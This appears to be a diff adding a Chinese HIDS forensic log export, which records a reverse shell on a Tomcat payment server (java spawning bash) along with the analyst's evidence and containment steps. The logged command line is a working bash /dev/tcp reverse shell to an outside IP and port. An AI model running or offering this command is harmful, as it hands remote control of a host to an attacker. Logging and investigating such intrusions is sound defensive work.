@@ -1,0 +1,23 @@
+==============================================================================
+ 安全狗 HIDS  取证日志导出
+ 导出时间: 2026-06-19 01:46:47  时区: Asia/Shanghai (UTC+8)
+ 关联规则: HIDS-RSHELL-0733  bash /dev/tcp 反弹 Shell
+ ATT&CK: T1059.004 Unix Shell
+==============================================================================
+
+2026-06-18 19:33:00  app-pay-05  EventID=1 (ProcessCreate / Auth)
+  Computer: app-pay-05
+  User: tomcat
+  Image/Process: bash
+  CommandLine: bash -i >& /dev/tcp/45.32.118.9/4444 0>&1
+  ParentImage: java
+  Action: 进程创建
+  Hashes: SHA256=-
+
+2026-06-18 19:33:00  app-pay-05  EventID=3 (NetworkConnect)
+  SourceIp: 10.60.3.5  DestinationIp: 45.32.118.9:4444
+  DestinationHostname: -
+
+VERDICT: UNDER_INVESTIGATION
+KeyEvidence: java->bash 进程链；/dev/tcp/45.32.118.9/4444 反弹；tomcat 账号执行交互 shell
+Handling: 隔离主机、封禁外联、保全 Tomcat 访问日志定位入口漏洞，排查 webapps 目录后门。
